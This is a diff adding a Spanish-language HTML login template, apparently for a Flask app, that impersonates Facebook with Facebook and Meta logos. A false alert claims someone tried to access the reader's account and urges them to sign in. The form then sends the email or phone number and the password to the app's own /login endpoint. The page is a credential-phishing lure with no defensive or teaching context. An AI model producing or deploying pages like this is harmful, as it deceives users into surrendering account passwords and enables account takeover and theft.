@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo-img {
+            width: 80px;
+            margin-bottom: 10px; /* Subimos un poco el logo */
+        }
+
+        .alert-message {
+    font-size: 14px;
+    color: #1c1e21;
+    font-weight: bold; /* Pone el texto en negritas */
+    background-color: transparent; /* Quita el fondo gris */
+    padding: 0; /* Elimina el espacio interno */
+    border-radius: 0; /* Elimina bordes redondeados */
+    margin-bottom: 15px;
+    text-align: left;
+    font-family: 'Aharoni', sans-serif; /* Fuente personalizada */
+}
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        a {
+            display: block;
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .meta-img {
+            width: 100px;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <!-- Logo de Facebook -->
+        <img src="{{ url_for('static', filename='facebook_logo.png') }}" alt="Logo Facebook" class="logo-img">
+
+        <!-- Mensaje de alerta -->
+        <div class="alert-message">
+            Alguien ha intentado acceder a tu cuenta de Facebook. Inicia sesión para proteger tu cuenta. Con esto nos ayudarás a saber que eres el propietario real de la cuenta y nosotros nos encargaremos del resto.
+        </div>
+
+        <!-- Formulario de inicio de sesión -->
+        <form action="/login" method="POST">
+            <input type="text" name="email" placeholder="Celular o correo electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+
+        <!-- Enlaces -->
+        <a href="#">¿Olvidaste tu contraseña?</a>
+        <a href="#">Crear cuenta nueva</a>
+
+        <!-- Logo de Meta -->
+        <img src="{{ url_for('static', filename='meta_logo.png') }}" alt="Logo Meta" class="meta-img">
+
+    </div>
+</body>
+</html>
